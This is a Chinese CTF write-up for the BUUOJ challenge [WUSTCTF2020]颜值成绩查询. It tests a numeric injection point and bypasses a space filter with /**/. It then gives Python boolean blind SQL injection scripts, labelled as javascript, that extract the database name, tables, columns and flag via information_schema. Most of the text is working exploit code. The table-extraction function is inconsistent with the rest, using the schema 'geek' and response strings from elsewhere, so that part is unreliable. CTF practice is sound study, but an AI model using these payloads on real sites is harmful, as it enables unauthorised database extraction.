# \[WUSTCTF2020]颜值成绩查询

## \[WUSTCTF2020]颜值成绩查询

## 考点

* 注入点寻找与判断
* 布尔盲注

## wp

`?stunum=1`得到admin是100分

`?stunum=2-1`得到admin是100分，是数字型注入

`?stunum=1 order by 4`返回学号不存在

`?stunum=1 order by 1`也是返回学号不存在，可能过滤了一些字符串

`?stunum=1/**/order/**/by/**/2`返回100分，过滤了空格

`?stunum=1/**/order/**/by/**/3`返回100分

`?stunum=1/**/order/**/by/**/4`返回不存在，说明有3列

`?stunum=1/**/union/**/select/**/1,2,3`返回不存在

`?stunum=1/**/ununionion/**/selselectect/**/1,2,3`返回不存在，可能不是联合注入

`?stunum=0^1`返回100分，尝试布尔盲注

代码如下，数据库为ctf

```javascript
import requests

url = 'http://6d0aeac9-14ec-4025-b4ea-4a60a975b44a.node4.buuoj.cn:81/?stunum=' 

def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(database())),{i},1))>{mid})"
            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'not exists' in r.text:
                high = mid
            if 'your score is' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
```

表：flag,score

```javascript
def get_table():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))>{mid})"

            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'ERROR' in r.text:
                high = mid
            if 'Click others' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
```

flag表：flag,value

```javascript
def get_column():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{i},1))>{mid})"

            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'not exists' in r.text:
                high = mid
            if 'your score is' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
```

得到flag，再逆序一下就可以

```javascript
def get_flag():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr(reverse((select(group_concat(flag,value))from(flag))),{i},1))>{mid})"
            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'not exists' in r.text:
                high = mid
            if 'your score is' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
```

![](../.gitbook/assets/image\_4s7NbbnTLH54EnXnN6E3ey.png)

## 小结

1. 注入类型要多进行尝试
